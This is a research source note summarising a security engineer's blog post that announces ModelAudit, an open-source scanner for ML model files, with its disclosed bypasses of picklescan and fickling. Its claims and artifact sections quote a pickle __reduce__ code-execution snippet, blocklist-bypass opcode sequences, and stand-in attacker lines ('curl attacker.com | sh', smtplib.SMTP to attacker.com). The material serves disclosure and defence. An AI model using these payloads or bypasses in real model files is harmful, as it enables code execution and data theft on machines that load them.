---
source_url: https://www.promptfoo.dev/blog/open-sourcing-modelaudit/
source_type: blog-post
title: "Open-Sourcing ModelAudit: Security Scanner for ML Model Files"
author: "Yash Chhabria (Security Engineer, Promptfoo)"
date_published: 2026-03-03
date_extracted: 2026-07-26
last_checked: 2026-07-26
status: current
confidence_overall: emerging
issue: "#553"
---

# Open-Sourcing ModelAudit: A Static Security Scanner for ML Model Files

> A Promptfoo security engineer's technical deep-dive into ML model file supply
> chain security, announcing the open-source release of ModelAudit. The core
> contribution is the allowlist-first static analysis architecture that avoids
> the reactive gaps of blocklist-based scanners (fickling, picklescan),
> supported by 7 GHSAs filed against existing tools (including a CVSS 10.0
> universal bypass), zero-false-positive validation against 1,000+ real
> models, and 42+ format coverage with no ML framework dependencies.

## Source Context

- **Type**: blog-post (vendor security engineering announcement, Promptfoo /
  now part of OpenAI)
- **Author credibility**: Yash Chhabria is a Security Engineer at Promptfoo
  who previously "worked on model scanning at Databricks." The article
  describes ModelAudit, which he has been building since joining Promptfoo
  the previous September. The specific GHSA claims are independently verifiable
  (advisory links provided). The scanner comparison claims (detection rates,
  format coverage, false positives) are vendor assertions without independent
  validation. The bypass technique descriptions are technically detailed and
  consistent with known pickle VM internals. Overall, treat the CVE/GHSA
  analysis as high-credibility (coordinated disclosure, fixed by vendors) and
  the comparative effectiveness claims as vendor-positioned (plausible but not
  independently validated).
- **Scope**: Covers (1) the pickle deserialization attack surface for ML model
  files, (2) the architectural distinction between allowlist and blocklist
  scanning approaches, (3) 7 specific GHSAs against fickling and picklescan
  with code examples, (4) format coverage comparison across four open-source
  scanners, (5) real malicious Hugging Face model examples that evade other
  scanners, (6) validation methodology and false-positive elimination process,
  (7) CI/CD integration capabilities (SARIF, SBOM). Does NOT cover: runtime
  model behavior analysis, prompt injection, or LLM application security
  scanning — this is strictly about static analysis of model *file* artifacts.

## Extracted Claims

### Claim 1: Model files are executable at load time — the standard torch.load() pattern is a deserialization RCE vector that most teams do not scan for
- **Evidence**: The article opens with the observation that teams "pulled models
  from public registries, ran torch.load(), and treated the artifact like inert
  data" and draws a comparison to package security scanning: "Most teams do
  nothing equivalent" when downloading a model from Hugging Face. A code example
  demonstrates pickle's `__reduce__` mechanism executing os.system() during
  unpickling. JFrog is cited as having found "roughly 100 models on Hugging Face
  containing similar payloads."
- **Confidence**: settled
- **Quote**: "Before joining Promptfoo, I worked on model scanning at Databricks.
  Teams pulled models from public registries, ran torch.load(), and treated the
  artifact like inert data. Model files are executable at load time."
- **Our assessment**: The pickle deserialization RCE vector is well-established
  security knowledge. The article's value is in quantifying the gap: most teams
  run dependency scanning on pip packages but do nothing for model files, despite
  the same deserialization risk. The JFrog citation anchors this in real-world
  data. The `__reduce__` code example is the canonical demonstration of the
  mechanism.

### Claim 2: Blocklist-based scanners (fickling, picklescan) are architecturally reactive — maintaining a list of known-dangerous functions and allowing everything else through means one bypass defeats the entire defense
- **Evidence**: The article states the architectural weakness directly and
  provides supporting data: "Fickling has 12 published GHSAs. Picklescan has
  60+. JFrog found 3 zero-day bypasses in picklescan (CVE-2025-10155/10156/10157,
  CVSS 9.3 each). Sonatype found 4 more." Blocklist-based scanners "maintain a
  list of known-dangerous functions and allow everything else through. An
  attacker only needs to find one function not on the list."
- **Confidence**: settled
- **Quote**: "The common weakness across blocklist-based scanners is
  architectural: maintain a list of known-dangerous functions and allow
  everything else through. An attacker only needs to find one function not on
  the list."
- **Our assessment**: This is a foundational security design principle. The
  blocklist-vs-allowlist tradeoff is well understood in other security domains
  (network firewalls, malware detection, web application firewalls) and the
  article's application of it to ML model scanning is sound. The volume of
  GHSAs (12 for fickling, 60+ for picklescan) serves as empirical evidence
  for the architectural claim. This is high-value for the guide: teams
  evaluating model scanners should prefer allowlist-first approaches.

### Claim 3: pkgutil.resolve_name provides a CVSS 10.0 universal blocklist bypass against picklescan — one opcode sequence "bypasses the entire blocklist"
- **Evidence**: The article describes GHSA-vvpj-8cmc-gx39 (CVSS 10.0).
  `pkgutil.resolve_name()` resolves any `"module:attribute"` string to the
  actual Python object at runtime. A malicious pickle uses it as the REDUCE
  callable to obtain a reference to any blocked function — os.system,
  builtins.exec, anything — without that function's name appearing in the
  pickle opcodes. The blocklist never sees os.system; it only sees
  `pkgutil.resolve_name`, which is not blocked.
- **Confidence**: settled
- **Quote**: "GLOBAL pkgutil resolve_name # not blocked by picklescan / ... /
  REDUCE # pkgutil.resolve_name(\"os:system\") → os.system / # picklescan sees:
  pkgutil.resolve_name → CLEAN / # actual effect: os.system obtained, ready to
  call with arbitrary arguments"
- **Our assessment**: A CVSS 10.0 universal bypass demonstrates the fundamental
  limitation of blocklist-based approaches in the most severe possible terms.
  `pkgutil.resolve_name` is a stdlib function with a legitimate purpose that
  happens to be a perfect blocklist escape hatch. This is the strongest possible
  evidence for Claim 2's architectural argument. No existing scanner that relies
  on function-name blocklisting can defend against this pattern without
  fundamentally changing its approach.

### Claim 4: Fickling's OBJ opcode handler invisibility (CVSS 8.6) allows RCE calls to vanish from AST analysis entirely
- **Evidence**: GHSA-mxhj-88fx-4pcv (CVSS 8.6). Fickling's OBJ opcode handler
  "pushed function calls onto the interpreter stack without saving them to the
  AST." By discarding the result with POP, the call vanishes from analysis
  entirely, and fickling reports LIKELY_SAFE even for reverse shell commands.
- **Confidence**: settled
- **Quote**: "OBJ(os.system, \"curl attacker.com | sh\") # call happens at load
  time / POP # result discarded from stack / # → call vanishes from AST,
  fickling reports LIKELY_SAFE"
- **Our assessment**: This is a concrete implementation bug in Fickling's
  parser, not a blocklist gap. The result — a pickle spawning a reverse shell
  while fickling reports LIKELY_SAFE — demonstrates that even an allowlist-based
  scanner (which fickling has since added) is only as good as its opcode-level
  analysis correctness. This finding is significant because it shows that the
  scanner's internal representation of pickle VM execution must be semantically
  sound, not just its allowlist.

### Claim 5: Both fickling and picklescan are missing numerous unsafe stdlib modules in their blocklists, including ctypes, importlib, multiprocessing, codeop, code, compileall, runpy, profile, pdb, smtplib, socketserver, signal, and sqlite3
- **Evidence**: The article details four GHSAs: (a) fickling's UNSAFE_IMPORTS
  missing uuid, _osx_support, and _aix_support (GHSA-5hwf-rc88-82xm), (b)
  CVE-2026-22609 — missing ctypes, importlib, and multiprocessing from
  fickling's unsafe-imports list, (c) fickling's likely_safe_imports treating
  smtplib, socketserver, signal, and sqlite3 as safe (GHSA-mhc9-48gj-9gp3),
  (d) picklescan missing codeop, code, compileall, py_compile, runpy, profile,
  and pdb from its blocklist (GHSA-g38g-8gr9-h9xp, CVSS 9.8). Each is
  demonstrated with concrete pickle opcode sequences confirming the tool
  reported CLEAN or LIKELY_SAFE.
- **Confidence**: settled
- **Quote**: "At least 3 stdlib modules that provide direct arbitrary command
  execution were not blocked: uuid, _osx_support, and _aix_support. These
  modules contain functions that internally call subprocess.Popen() or
  os.system() with attacker-controlled arguments. Despite the platform-specific
  names, all three are importable on every platform."
- **Our assessment**: These are systemic blocklist enumeration failures. The
  modules involved span multiple risk categories: native code loading (ctypes),
  code compilation/evaluation (codeop, code, compileall, py_compile, runpy,
  profile, pdb), network backdoors (socketserver, smtplib), and system
  manipulation (signal). The fact that all four categories had gaps in both
  scanners supports Claim 2's architectural argument: a comprehensive blocklist
  is extremely difficult to maintain and will inevitably have gaps.

### Claim 6: ModelAudit uses an allowlist-first architecture with format-specific analysis across 42+ model file formats, significantly more than any other open-source scanner
- **Evidence**: The article states ModelAudit covers "42+ formats" with
  format-specific analysis. The format coverage comparison table shows
  ModelAudit as the only open-source scanner supporting ONNX, SafeTensors,
  GGUF/GGML, TFLite, JAX/Flax, TensorRT, OpenVINO, CoreML, PaddlePaddle,
  and 30+ other model formats. Picklescan covers ~4 formats, Fickling ~2,
  and ModelScan ~8. ModelAudit also supports archive analysis (TAR, 7-Zip),
  configuration file scanning (JSON, YAML, XML, TOML), and weight distribution
  analysis.
- **Confidence**: emerging
- **Quote**: "ModelAudit is a static scanner for ML model files. It flags
  unsafe loading behaviors (deserialization RCE, archive tricks), known CVEs,
  and suspicious artifacts across 42+ formats, without executing the model or
  importing ML frameworks."
- **Our assessment**: The format coverage is verifiable from the open-source
  repository. The claim that this is the widest coverage among open-source
  scanners is supported by the comparison table. However, format breadth alone
  does not determine scanner quality — detection depth per format and false
  positive rate are equally important. The claim should be used as "ModelAudit
  has the broadest format support" rather than "ModelAudit is the best scanner."

### Claim 7: Real malicious models on Hugging Face evade every other scanner in Hugging Face's scanning pipeline but are caught by ModelAudit
- **Evidence**: Four real Hugging Face models are presented with per-scanner
  results: (1) Rammadaeus/tflite-flex-bypass-poc — a TFLite file with 4
  malicious custom operators; VirusTotal, JFrog, and ClamAV report no issue;
  picklescan and ModelScan don't support TFLite; ModelAudit catches all four
  malicious operators. (2) 0xnu/mnist-ocr — `mnist_tokenizer.pkl` with
  `__main__.ImageTokenizer` via NEWOBJ opcode; VirusTotal, JFrog, and
  ModelScan miss it; only ClamAV flags it via signature matching. (3)
  NewstaR/GPTagalog — torch.storage._load_from_bytes via REDUCE (21 instances);
  VirusTotal, JFrog, and ModelScan miss it entirely. (4) Freakhobbies/Model-01.pkl
  — same pattern; JFrog and ModelScan report no issue; Picklescan flags as
  informational only.
- **Confidence**: emerging
- **Quote**: "During our last batch of refinement for ModelAudit, we stumbled
  across models that we caught true positives on that bypass every other scanner
  in Hugging Face's pipeline."
- **Our assessment**: The four examples are real Hugging Face models and the
  claims about their malicious characteristics are specific (operator names,
  opcode patterns, scanner results). However, these appear to have been
  discovered by the team during their own testing and the scanner comparison
  results are self-reported. Independent verification would strengthen the
  claim. Despite this limitation, the concrete examples provide valuable
  teaching material for the guide's model supply chain security section.

### Claim 8: Roughly 45% of popular Hugging Face models still use the pickle format, making format-native deserialization risks a persistent threat
- **Evidence**: The article cites a CCS 2025 paper (attributed to Brown
  University, "PickleBall"): "But roughly 45% of popular Hugging Face models
  still use pickle (CCS 2025)." The article also notes that safetensors
  (which eliminates executable code from the format entirely) is the
  recommended alternative, but format conversion itself is an attack surface.
- **Confidence**: emerging
- **Quote**: "But roughly 45% of popular Hugging Face models still use pickle
  (CCS 2025), and the conversion pipeline itself can be a target."
- **Our assessment**: The 45% figure is attributed to a published academic
  paper (CCS 2025, referenced as PickleBall — cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf)
  and is the best available estimate. If accurate, nearly half of models on the
  most popular public registry use a format with known executable-at-load-time
  properties. The secondary point — that converting from pickle to safetensors
  requires running the pickle deserializer, which is itself an attack vector —
  is a critical nuance for anyone planning a migration-based remediation strategy.

### Claim 9: ModelAudit achieves zero false positives across 1,000+ real models and 5,000+ security checks
- **Evidence**: The article describes the validation methodology: "1,000+ models
  scanned across 14 formats, 5,000+ security checks, zero false positives on the
  final 100-model regression run." Since then, the team "expanded to 42+ formats
  with 12 new scanners and validated against an additional 200+ models — all
  clean." The article frames this as the threshold that "triggered the
  open-source decision."
- **Confidence**: anecdotal
- **Quote**: "The maturity milestone: 1,000+ models scanned across 14 formats,
  5,000+ security checks, zero false positives on the final 100-model regression
  run."
- **Our assessment**: Zero false positives is an unusually strong claim for a
  security scanner. The validation methodology (regression against real Hugging
  Face models) is reasonable, but several factors should give the guide pause:
  (a) the model set is self-selected by the vendor, (b) "false positive" is
  defined by the scanner's own criteria, (c) the final regression run is only
  100 models, and (d) the claim is unverified by independent testing. The
  claim is useful as evidence that the allowlist approach can be practically
  calibrated to avoid common pitfalls (framework version differences,
  legitimate edge cases), but should not be presented as an independently
  validated property.

### Claim 10: ModelAudit runs fully offline with no ML framework dependencies, making it suitable for CI/CD pipelines where installing PyTorch/TensorFlow is impractical
- **Evidence**: The article states: "The scanning engine runs entirely offline
  - it never loads or executes the model" and requires "No ML framework
  dependencies." The compatibility matrix confirms Python 3.10–3.13, Linux/macOS/Windows.
- **Confidence**: settled
- **Quote**: "The scanning engine runs entirely offline - it never loads or
  executes the model."
- **Our assessment**: This is a verifiable property of the open-source code and
  an important design decision. The "no ML framework dependencies" requirement
  means teams can run model scanning in CI without pulling in gigabytes of ML
  libraries — a practical advantage over ModelScan (which requires framework
  imports) and a key enabler for offline/air-gapped environments. This is
  directly relevant to the guide's CI/CD chapter.

### Claim 11: ModelAudit detected 16 issues across 11 test files vs ModelScan's 3 in a head-to-head comparison
- **Evidence**: The article references a comparison blog post: "In a head-to-head
  comparison against ModelScan, ModelAudit detected 16 issues across 11 test
  files vs ModelScan's 3." The linked comparison post (modelaudit-vs-modelscan)
  provides full methodology: open-source test files, ModelAudit v0.1.0 vs
  ModelScan v0.8.5, 11 test files covering pickle, config, archive, and PMML
  formats. ModelAudit analyzed 11/11 files (100%), ModelScan 6/11 (55%).
  ModelAudit found path traversal in archives and configuration security issues
  that ModelScan could not process.
- **Confidence**: emerging
- **Quote**: "In a head-to-head comparison against ModelScan, ModelAudit
  detected 16 issues across 11 test files vs ModelScan's 3."
- **Our assessment**: The comparison methodology is transparent and reproducible
(test files and scripts on GitHub), giving it more weight than a purely
  rhetorical comparison. However, the issue count difference partly reflects
  format coverage differences — ModelScan processes 6/11 files, so much of the
  gap is structural (ModelScan cannot analyze config files or ONNX), not a
  head-to-head detection rate difference on the same files. The real value is
  in the type of issues found (path traversal, configuration security, secret
  detection) that are outside ModelScan's scope entirely.

### Claim 12: ModelAudit supports SARIF output, SBOM generation, secret scanning, and license detection — capabilities absent from all other open-source model scanners
- **Evidence**: The capability comparison table shows ModelAudit is the only
  open-source scanner with CVE detection rules, SARIF output, SBOM generation,
  secret scanning, license detection, and remote pulls from S3/GCS/Hugging Face.
  The CI/CD integration docs (linked from the blog post) provide concrete GitHub
  Actions workflows using SARIF output for GitHub Code Scanning integration and
  scheduled scans with SBOM generation.
- **Confidence**: settled
- **Quote**: "ModelAudit is the widest-coverage open-source scanner available,
  with format-specific analysis across 42+ formats, built-in CVE detection
  rules, and SARIF output for CI/CD integration."
- **Our assessment**: These are verifiable tool features. SARIF integration is
  particularly significant because it allows model scan results to appear in
  GitHub Code Scanning / GitLab SAST alongside application security findings,
  integrating model supply chain security into existing developer workflows
  rather than requiring a separate review process. SBOM generation addresses
  emerging regulatory requirements for ML model supply chain documentation.

### Claim 13: The unsafe-imports gap in fickling extended to network and system modules — smtplib.SMTP and socketserver.TCPServer were treated as safe because they are stdlib modules
- **Evidence**: GHSA-mhc9-48gj-9gp3. Fickling's `likely_safe_imports` set
  included all stdlib modules, so `smtplib`, `socketserver`, `signal`, and
  `sqlite3` were treated as LIKELY_SAFE. A pickle calling
  `socketserver.TCPServer` to open a backdoor listener or `smtplib.SMTP` to
  exfiltrate data passed all five safety interfaces. The article demonstrates
  "smtplib.SMTP(\"attacker.com\") → opens TCP connection" as fickling:
  LIKELY_SAFE.
- **Confidence**: settled
- **Quote**: "STACK_GLOBAL smtplib SMTP # stdlib module - added to
  likely_safe_imports ... REDUCE # smtplib.SMTP(\"attacker.com\") → opens TCP
  connection / # → fickling: LIKELY_SAFE (smtplib is stdlib, skipped by
  OvertlyBadEvals)"
- **Our assessment**: This is a dangerous gap because it stems from a
  design-level assumption (stdlib = safe) rather than an oversight in the
  allowlist. Including all stdlib modules by default means any stdlib module
  with network or execution capabilities becomes an unblocked vector.
  `socketserver.TCPServer` enabling a persistent backdoor listener is
  particularly concerning because the attack persists beyond the initial
  unpickling.

### Claim 14: ModelAudit is complementary to existing scanners — teams should run it alongside picklescan or ModelScan with aggregated SARIF results
- **Evidence**: The article explicitly states: "Teams already using picklescan
  or ModelScan can run ModelAudit alongside them; SARIF results from multiple
  scanners aggregate in the same CI pipeline" and "ModelAudit is not a
  replacement for these tools - they've all contributed to making this space
  better."
- **Confidence**: settled
- **Quote**: "ModelAudit is not a replacement for these tools - they've all
  contributed to making this space better."
- **Our assessment**: This is a pragmatic recommendation. Running multiple
  scanners with different architectures (allowlist and blocklist) provides
  defense-in-depth against either approach's blind spots. The SARIF aggregation
  capability makes this practical without requiring separate review pipelines.
  This directly informs the guide's recommendation for model supply chain
  security tooling.

## Concrete Artifacts

### Pickle deserialization RCE example (from the article)

```python
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("touch /tmp/pwned",))
# When loaded via pickle.loads() or torch.load(),
# os.system() executes the command.
payload = pickle.dumps(Exploit())
```

Source: blog post, "Model files execute code at load time" section.

### ModelAudit example scan output (verbatim from the article)

```
Scanning suspicious_model.pkl...
📊 SCAN SUMMARY
  Files: 1 | Duration: 0.29s
  Security Checks: ✅ 12 passed / ❌ 3 failed

🔍 SECURITY FINDINGS
  🚨 2 Critical | ⚠️ 1 Warning

  └─ 🚨 [suspicious_model.pkl (pos 45)] Found REDUCE opcode with non-allowlisted global: posix.system
     Why: The REDUCE opcode calls a callable with arguments, effectively executing arbitrary Python functions.
     This is the primary mechanism for pickle-based code execution attacks.
     opcode: REDUCE
     associated_global: posix.system (os.system on Unix)

  └─ ⚠️ [suspicious_model.pkl] Model affected by CVE-2025-32434 (PyTorch weights_only bypass)
     severity: CRITICAL
     affected_versions: torch<2.6.1
     remediation: Upgrade to torch>=2.6.1

❌ CRITICAL SECURITY ISSUES FOUND
```

Source: blog post, "Example output" section. Verbatim.

### pkgutil.resolve_name universal bypass opcode sequence (verbatim from the article)

```
GLOBAL    pkgutil resolve_name    # not blocked by picklescan
MARK
SHORT_BINUNICODE "os:system"      # the actual target, passed as data
TUPLE
REDUCE                            # pkgutil.resolve_name("os:system") → os.system
# picklescan sees: pkgutil.resolve_name → CLEAN
# actual effect: os.system obtained, ready to call with arbitrary arguments
```

Source: blog post, "Picklescan bypasses → GHSA-vvpj-8cmc-gx39" section.

### Profile.run() blocklist mismatch (verbatim from the article)

```
GLOBAL    profile run             # module-level function, not Profile.run
MARK
SHORT_BINUNICODE "os.system('id')" # arbitrary Python statement
TUPLE
REDUCE                            # profile.run("os.system('id')") → exec() internally
# picklescan blocklist has: profile.Profile.run ← doesn't match "run"
# picklescan result: CLEAN
```

Source: blog post, "Picklescan bypasses → GHSA-7wx9-6375-f5wh" section.

### OBJ opcode invisibility in fickling (verbatim from the article)

```
OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
POP                                       # result discarded from stack
# → call vanishes from AST, fickling reports LIKELY_SAFE
```

Source: blog post, "Fickling bypasses → GHSA-mxhj-88fx-4pcv" section.

### Real malicious Hugging Face models that evade other scanners

| Model | Format | What other scanners report | ModelAudit |
|---|---|---|---|
| Rammadaeus/tflite-flex-bypass-poc | TFLite | VirusTotal/JFrog/ClamAV: no issue; picklescan/ModelScan: unsupported | 4 CRITICAL findings |
| 0xnu/mnist-ocr | Pickle (.pkl) | VirusTotal/JFrog/ModelScan: no issue; ClamAV: signature match | CRITICAL |
| NewstaR/GPTagalog | Pickle (396 MB) | VirusTotal/JFrog/ModelScan: no issue; ClamAV: signature match | CRITICAL |
| Freakhobbies/Model-01.pkl | PyTorch (7.6 GB) | JFrog/ModelScan: no issue; picklescan: informational only | CRITICAL |

Source: blog post, "Model files execute code at load time" section — four
specific Hugging Face models referenced.

### Format coverage comparison table (from the article, condensed)

| Format | picklescan | Fickling | ModelScan | ModelAudit |
|---|---|---|---|---|
| Pickle (.pkl/.pickle) | Yes | Yes | Yes | Yes |
| Dill (.dill) | — | — | Yes | Yes |
| PyTorch (.pt/.pth/.bin) | Yes | .pt/.pth | Yes | Yes |
| Joblib (.joblib) | Yes | — | Yes | Yes |
| Skops (.skops) | — | — | — | Yes |
| NumPy (.npy/.npz) | Yes | — | .npy only | Yes |
| Keras H5 (.h5/.hdf5) | — | — | Yes | Yes |
| Keras ZIP (.keras) | — | — | Yes | Yes |
| TF SavedModel (.pb) | — | — | Yes | Yes |
| ONNX (.onnx) | — | — | — | Yes |
| SafeTensors (.safetensors) | — | — | — | Yes |
| GGUF/GGML | — | — | — | Yes |
| TFLite (.tflite) | — | — | — | Yes |
| TensorRT (.plan/.engine) | — | — | — | Yes |
| JAX/Flax (.msgpack/.orbax) | — | — | — | Yes |
| **Total format categories** | **~4** | **~2** | **~8** | **42+** |

Source: blog post, "Format coverage comparison" section.

### Capability comparison table (from the article)

| Capability | picklescan | Fickling | ModelScan | ModelAudit |
|---|---|---|---|---|
| CVE detection rules | No | No | No | Yes |
| SARIF output | No | No | No | Yes |
| SBOM generation | No | No | No | Yes |
| Secret scanning | No | No | No | Yes |
| License detection | No | No | No | Yes |
| Remote pulls (S3/GCS/HF) | HF/URL | No | No | Yes |
| Allowlist approach | Partial | Yes | No | Yes |
| No ML framework deps | Yes | Yes | No | Yes |

Source: blog post, "Format coverage comparison → Capability" table.

### CI/CD integration exit codes (from the linked CI/CD docs)

```
Exit code 0: No security issues found
Exit code 1: Security issues detected (warnings or critical findings)
Exit code 2: Operational errors or inconclusive scans
```

Source: Promptfoo docs, "CI/CD Integration → Exit Codes" section (linked from
blog post as the "CI/CD integration guide").

### GitHub Actions workflow for PR model scanning (from the linked CI/CD docs, condensed)

```yaml
name: Model Security Scan
on:
  pull_request:
    types: [opened, synchronize, reopened]
jobs:
  scan-models:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Install Promptfoo and ModelAudit
        run: |
          npm install -g promptfoo
          pip install modelaudit
      - name: Get changed model files
        run: |
          MODEL_EXTENSIONS='pkl|pickle|dill|pth|pt|ckpt|...'
          CHANGED=$(git diff --name-only --diff-filter=ACM \
            ${{ github.event.pull_request.base.sha }} ${{ github.sha }} | \
            grep -Ei "\.(${MODEL_EXTENSIONS})$" || true)
```

Source: Promptfoo docs, "CI/CD Integration → GitHub Actions → Scan Changed Model Files"
section. Complete workflow includes file detection, scanning, artifact upload, and
critical-issue checking with jq.

## Cross-References

### Candidate notes from `miner-related-notes.md` — dismissal

1. `source-notes/docs-langfuse-mcp-server.md` — Langfuse MCP server for documentation
   access. No overlap with model file security scanning. **Dismiss**.
2. `source-notes/docs-google-sre-reliable-product-launches.md` — SRE launch
   coordination engineering. No overlap. **Dismiss**.
3. `source-notes/docs-google-sre-prodcast-04-05-furino-slos.md` — SLOs.
   No overlap. **Dismiss**.
4. `source-notes/blog-incidentio-ai-sre-incident-run.md` — AI SRE incident
   handling. No overlap. **Dismiss**.
5. `source-notes/docs-google-sre-prodcast-03-07-retail-gaming.md` —
   Retail/gaming SRE. No overlap. **Dismiss**.
6. `source-notes/docs-google-sre-prodcast-04-09-ai-agents.md` — AI agent
   capabilities, safety, and guardrails. Tangentially related at the "AI
   security" level, but covers agent behavior (tool execution, permissions),
   not ML model file artifact security. **Dismiss** — different security layer.
7. `source-notes/docs-google-sre-prodcast-04-08-tpm-ai.md` — TPM and AI.
   No overlap. **Dismiss**.
8. `source-notes/docs-langfuse-security-and-guardrails.md` — Runtime LLM app
   security guardrails (PII scanning, prompt injection detection, output
   scanners). This source covers model file *static analysis* — a different
   security layer. Both are about LLM stack security but at different levels
   (model artifact vs application runtime). **Dismiss** — complementary layers,
   not overlapping.
9. `source-notes/docs-google-sre-prodcast-03-05-building-reliable-systems.md` —
   Building reliable systems. No overlap. **Dismiss**.
10. `source-notes/docs-google-sre-prodcast-05-02-slos-hidalgo-singer.md` — SLOs.
    No overlap. **Dismiss**.

### Cross-references against existing notes

- **Corroborates**: None. No existing source note covers ML model file supply
  chain security or model artifact scanning. The topic is genuinely novel in
  the corpus. The closest thematic relatives are:
  - `blog-promptfoo-building-security-scanner-llm-apps.md` — covers static
    code analysis for prompt-injection paths in LLM applications. Both are
    static analysis approaches to LLM security, but at different layers:
    application code (that note) vs model file artifacts (this note). They
    are complementary, not corroborating — there is no claim overlap.
  - `docs-langfuse-security-and-guardrails.md` — covers runtime guardrail
    scanning of LLM inputs/outputs. Both involve security scanning in the
    LLM stack, but at different layers: runtime content (Langfuse) vs static
    model files (this note). The allowlist-vs-blocklist architectural tradeoff
    discussed in this note (Claim 2) could inform guardrail tool selection in
    the Langfuse note's domain, but no existing claim in that note speaks to
    model file scanning.

- **Contradicts**: None identified. No existing source note makes a claim
  about ML model file security that this source would oppose. The claims in
  this note are about a previously uncovered topic (model artifact supply
  chain security). The architectural argument (allowlist > blocklist for
  model scanning) is a new design-position claim but does not contradict any
  existing note because no prior note addresses scanner architecture for model
  files. No contradiction issue is required.

- **Extends**: No existing source note is directly extended by this material,
  because the topic is novel. However, this note adds a *model artifact layer*
  to the LLM supply chain security stack that existing notes address at
  the application and runtime levels:
  - Extends the security scanning concept in
    `blog-promptfoo-building-security-scanner-llm-apps.md` from application
    code scanning to model file scanning — together they describe a
    multi-layer static analysis strategy for LLM systems (code + models).
  - Extends the guardrail/defense-in-depth concept from
    `docs-langfuse-security-and-guardrails.md` with the observation that
    "runtime defenses don't matter" if the model file itself is compromised
    at load time — adding a precondition layer upstream of runtime guardrails.
  - Extends the supply chain risk discussion in
    `blog-promptfoo-mckinsey-lilli-appsec.md` (which covers enterprise
    LLM application security) by identifying model file registries as a
    critical but unaddressed supply chain attack surface.

- **Novel**: This is the first source note in the corpus to address ML model
  file supply chain security. All 14 claims are novel:
  - The pickle deserialization attack surface for ML model artifacts (Claim 1)
  - The allowlist-vs-blocklist architectural analysis for model scanners
    (Claim 2) with specific bypass evidence
  - The 7 GHSAs against fickling and picklescan, including the CVSS 10.0
    universal bypass (Claims 3, 4, 5, 13)
  - The 42+ format coverage comparison (Claim 6, Concrete Artifacts tables)
  - The real malicious Hugging Face model examples (Claim 7)
  - The 45% pickle usage figure from the CCS 2025 paper (Claim 8)
  - The zero-false-positive validation methodology (Claim 9)
  - The no-ML-framework-dependencies design decision for offline CI/CD
    scanning (Claim 10)
  - The head-to-head comparison with ModelScan (Claim 11)
  - The SARIF/SBOM/secret-scanning capability set (Claim 12)
  - The multi-scanner defense-in-depth recommendation with SARIF aggregation
    (Claim 14)
  - The CI/CD integration patterns (GitHub Actions, GitLab CI, Jenkins,
    CircleCI) with concrete workflow YAML (Concrete Artifacts, from linked
    CI/CD integration guide)

## Guide Impact

- **Chapter 05 / 07 (Security and Red-Teaming)**: This is the primary
  destination. Add a new subsection on **ML model file supply chain security**
  covering:
  - **The deserialization risk** (Claim 1): model files loaded via
    torch.load()/pickle.loads() execute arbitrary code at load time. Use the
    concrete `__reduce__` code example as the canonical demonstration.
    Recommend safetensors as the preferred format where possible, with the
    caveat that conversion pipelines are themselves attack surfaces (Claim 8).
  - **Scanner architecture guidance** (Claim 2): teams evaluating model
    scanning tools should prefer allowlist-first approaches over
    blocklist-based approaches. Use the pkgutil.resolve_name CVSS 10.0
    bypass (Claim 3) and profile.run() blocklist mismatch (Claim 5, Concrete
    Artifacts) as worked examples of blocklist failures.
  - **Multi-scanner defense-in-depth** (Claim 14): recommend running both an
    allowlist-based and a blocklist-based scanner with aggregated SARIF
    output for defense-in-depth coverage. The format coverage comparison
    table (Concrete Artifacts) helps teams decide which combination covers
    their toolchain's formats.
  - **CI/CD integration patterns** (Concrete Artifacts, from linked CI/CD
    integration guide): provide the exit code semantics (0=clean, 1=findings,
    2=operational error), the GitHub Actions workflows for PR scanning and
    scheduled audits, and the --strict mode for production deployment gating.
    Recommend tiered scanning: fast PR-scans of changed files + comprehensive
    scheduled scans + production gate with --strict.
  - **The false-positive elimination methodology** (Claim 9) as a reference
    point for teams building their own scanning validation pipelines: test
    against real models across framework versions, regression-test format
    upgrades, and budget for multiple rounds of edge-case elimination.

- **Chapter 03 (LLM Operations / CI/CD)**: Add the model scanning CI/CD
  patterns as a new pipeline stage alongside application security scanning.
  The concrete GitHub Actions workflows (Concrete Artifacts) are directly
  reusable. Key patterns:
  - Scan only changed model files on PR for fast feedback
  - Run comprehensive scheduled scans (weekly) with SBOM generation
  - Gate production deployments with `--strict` mode
  - Cache pip/npm dependencies and use parallel xargs scanning for performance
  - Use SARIF output for GitHub Code Scanning integration

- **Chapter 06 (Agent Architecture)**: Add the observation that model file
  security is a precondition for agent safety — if an agent loads a
  compromised model file, runtime guardrails and tool permissions are
  irrelevant because the compromise happens before the application starts
  ("runtime defenses don't matter"). This connects the model supply chain
  security layer to the agent safety architecture covered in the existing
  `docs-google-sre-prodcast-04-09-ai-agents.md` and
  `blog-promptfoo-building-security-scanner-llm-apps.md` notes.

## Extraction Notes

- Source fetched 2026-07-26 via curl from the published blog post URL.
  The article is a single self-contained blog post (published 2026-03-03 by
  Yash Chhabria, Security Engineer at Promptfoo). All direct quotes were
  extracted character-for-character from the rendered HTML text.
- Two linked sub-pages were also fetched and extracted: the ModelAudit vs
  ModelScan comparison post (blog/modelaudit-vs-modelscan) and the CI/CD
  integration guide (docs/model-audit/ci-cd/). The comparison post provides
  the detailed methodology behind Claim 11; the CI/CD guide provides the
  concrete workflow YAML in the Concrete Artifacts section.
- The article is a product announcement with substantial technical depth.
  The bypass technique descriptions (GHSAs) are independently verifiable
  through the linked advisory URLs. The comparison claims (format coverage,
  detection rates, false positives) are vendor self-reported and would
  benefit from independent validation.
- `confidence_overall` is set to **emerging** following the precedent of
  related Promptfoo source notes. The GHSA/CVE descriptions are settled
  (coordinated disclosure, fixed by vendors). The effectiveness comparisons
  and false-positive claims are vendor-positioned and lack independent
  validation. The architectural analysis (allowlist > blocklist) is sound as
  a design principle but its application to model scanning is ModelAudit's
  own argument.
- No contradiction was found with any existing source note. This is a
  genuinely novel topic for the corpus (model file supply chain security).
  The allowlist-vs-blocklist architectural argument is new and does not
  contradict any existing claim because no prior note addresses scanner
  architecture. No contradiction issue was filed.
